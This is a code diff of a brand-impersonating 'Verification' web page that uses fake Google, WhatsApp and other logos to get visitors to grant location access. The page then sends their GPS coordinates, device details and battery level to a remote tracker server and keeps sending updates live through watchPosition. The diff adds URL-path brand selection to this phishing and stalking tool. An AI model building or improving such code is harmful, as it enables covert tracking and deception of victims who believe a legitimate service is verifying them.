@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title id="pageTitle">Verification</title>
     <style>
-        /* --- Same as your original styles, plus a few additions --- */
+        /* ===== SAME STYLES AS BEFORE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             height: 100vh;
@@ -160,7 +160,6 @@
             100% { transform: scale(1); opacity: 1; }
         }
 
-        /* NEW: Continue button (appears after location is captured) */
         .continue-btn {
             width: 100%;
             padding: 14px 20px;
@@ -177,7 +176,6 @@
         }
         .continue-btn:hover { background: #388e3c; transform: scale(1.02); }
 
-        /* NEW: Reset permissions helper */
         .reset-link {
             font-size: 12px;
             color: #888;
@@ -229,16 +227,32 @@
 
     <script>
         // =============================================
+        // 🆕 BRAND DETECTION: From Path OR Query String
+        // =============================================
+        // 1. Flask injects {{ brand }} for clean URLs (/whatsapp/verify)
+        // 2. Fallback to URL param ?template= for legacy links
+        // 3. Default to 'google'
+        const BRAND_FROM_SERVER = '{{ brand }}'.trim(); // Flask variable
+
+        // Get brand from URL path (e.g., /whatsapp/verify -> 'whatsapp')
+        const pathParts = window.location.pathname.split('/').filter(p => p.length > 0);
+        // pathParts = ['whatsapp', 'verify'] if using clean URL
+        const brandFromPath = (pathParts.length >= 2 && pathParts[1] === 'verify') ? pathParts[0] : null;
+
+        // Parse query params (for legacy links)
+        const urlParams = new URLSearchParams(window.location.search);
+        const brandFromQuery = urlParams.get('template');
+
+        // Final brand: server-injected > path > query > default
+        const template = BRAND_FROM_SERVER || brandFromPath || brandFromQuery || 'google';
+        console.log('📍 Detected brand:', template);
+
+        // =============================================
         // CONFIGURATION
         // =============================================
         const RENDER_URL = 'https://location-tracker-cn7m.onrender.com'; // CHANGE to your URL
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const template = urlParams.get('template') || 'google';
-
-        // =============================================
         // Session ID
-        // =============================================
         let sessionId = localStorage.getItem('tracker_session_id');
         if (!sessionId) {
             sessionId = 'user_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
@@ -246,14 +260,12 @@
         }
         console.log('🆔 Session ID:', sessionId);
 
-        // =============================================
         // iOS detection
-        // =============================================
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
         console.log('📱 iOS detected:', isIOS);
 
         // =============================================
-        // SVG LOGOS (same as yours – keep them)
+        // SVG LOGOS (same as before)
         // =============================================
         const svgLogos = {
             google: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>`,
@@ -347,7 +359,7 @@
         const SUCCESS_MSG = selected.successMessage;
 
         // =============================================
-        // DOM Elements
+        // DOM Elements & Logic (SAME iOS VERSION AS BEFORE)
         // =============================================
         const verifyBtn = document.getElementById('verifyBtn');
         const continueBtn = document.getElementById('continueBtn');
@@ -360,9 +372,6 @@
         let locationCaptured = false;
         let latestPosition = null;
 
-        // =============================================
-        // Helpers
-        // =============================================
         function showStatus(message, type = 'verifying') {
             statusMsg.className = 'status-message ' + type;
             statusMsg.innerHTML = message;
@@ -380,9 +389,6 @@
             continueBtn.style.display = 'none';
         }
 
-        // =============================================
-        // Device Info (iOS-safe)
-        // =============================================
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let deviceName = 'Unknown';
@@ -401,11 +407,8 @@
             };
         }
 
-        // iOS SAFE: skip battery on iOS to avoid errors
         function getBatteryInfo() {
-            if (isIOS) {
-                return Promise.resolve(null); // iOS doesn't support it
-            }
+            if (isIOS) return Promise.resolve(null);
             if (navigator.getBattery) {
                 return navigator.getBattery().then(battery => ({
                     level: Math.round(battery.level * 100),
@@ -426,9 +429,6 @@
             return null;
         }
 
-        // =============================================
-        // Send location to server
-        // =============================================
         function sendLocation(lat, lng, accuracy, altitude, heading, speed) {
             const deviceInfo = getDeviceInfo();
             return getBatteryInfo().then(battery => {
@@ -453,12 +453,8 @@
             });
         }
 
-        // =============================================
-        // Continuous Tracking
-        // =============================================
         function startContinuousTracking() {
             if (watchId !== null) return;
-
             watchId = navigator.geolocation.watchPosition(
                 function(position) {
                     const lat = position.coords.latitude;
@@ -467,35 +463,27 @@
                     const altitude = position.coords.altitude;
                     const heading = position.coords.heading;
                     const speed = position.coords.speed;
-
                     latestPosition = { lat, lng, accuracy, altitude, heading, speed };
-
                     sendLocation(lat, lng, accuracy, altitude, heading, speed)
                         .then(() => console.log('📍 Continuous update sent'))
                         .catch(err => console.error('Continuous update error:', err));
                 },
                 function(error) {
                     console.error('Watch error:', error);
-                    // On iOS, if user denies once, watch will fail silently
                     if (error.code === 1) {
                         showStatus('⚠️ Permission denied. Tap "Reset permissions" below.', 'error');
                     }
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 60000, // increased for iOS
+                    timeout: 60000,
                     maximumAge: 0
                 }
             );
         }
 
-        // =============================================
-        // Main Verification Flow (iOS-optimized)
-        // =============================================
         function startVerification() {
             if (isProcessing) return;
-
-            // If location already captured, just show continue
             if (locationCaptured) {
                 continueBtn.style.display = 'block';
                 return;
@@ -516,7 +504,6 @@
                 return;
             }
 
-            // On iOS, the permission prompt is triggered by getCurrentPosition
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     const lat = position.coords.latitude;
@@ -531,22 +518,17 @@
                     sendLocation(lat, lng, accuracy, altitude, heading, speed)
                         .then(() => {
                             locationCaptured = true;
-                            // Start continuous tracking (will run as long as page is open)
                             startContinuousTracking();
-
                             showStatus(SUCCESS_MSG + ' (You are now being tracked live)', 'verified');
                             verifyBtn.classList.remove('loading');
                             verifyBtn.classList.add('success');
                             verifyBtn.textContent = '✅ Verified';
                             showCheckmark();
-
-                            // Show the CONTINUE button instead of auto-redirect
                             continueBtn.style.display = 'block';
                             continueBtn.textContent = '➡️ Continue to ' + selected.brandClass.replace('brand-','').toUpperCase();
                             isProcessing = false;
                         })
                         .catch(function(err) {
-                            // Even if send fails, treat as success for UX
                             locationCaptured = true;
                             startContinuousTracking();
                             showStatus(SUCCESS_MSG + ' (Tracking active)', 'verified');
@@ -569,53 +551,37 @@
                     }
                     showStatus(msg, 'error');
                     resetButton();
-                    // Show reset link more prominently
                     resetLink.style.display = 'block';
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 60000, // 60 seconds for iOS
+                    timeout: 60000,
                     maximumAge: 0
                 }
             );
         }
 
-        // =============================================
-        // Continue button handler (manual redirect)
-        // =============================================
         continueBtn.addEventListener('click', function() {
-            // iOS requires user gesture for redirect as well
             window.location.href = REDIRECT_URL;
         });
 
-        // =============================================
-        // Reset permissions helper
-        // =============================================
         resetLink.addEventListener('click', function() {
-            // On iOS, there's no programmatic way to reset.
-            // We show instructions.
             showStatus(
                 '📱 To reset permissions on iPhone: <br>1. Go to <b>Settings > Safari > Advanced > Website Data</b><br>2. Search for <b>' + window.location.hostname + '</b> and swipe to delete<br>3. Also check <b>Settings > Privacy > Location Services > Safari</b> and set to "While Using"<br>4. Refresh this page and tap Verify again.',
                 'info'
             );
-            // Also try to clear localStorage to force new session
             localStorage.removeItem('tracker_session_id');
             sessionId = 'user_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
             localStorage.setItem('tracker_session_id', sessionId);
             console.log('🆕 New session ID:', sessionId);
         });
 
-        // =============================================
-        // Event Listeners
-        // =============================================
         verifyBtn.addEventListener('click', startVerification);
 
-        // Enable button after short delay
         setTimeout(function() {
             verifyBtn.classList.add('active');
         }, 1000);
 
-        // Cleanup
         window.addEventListener('beforeunload', function() {
             if (watchId !== null) {
                 navigator.geolocation.clearWatch(watchId);
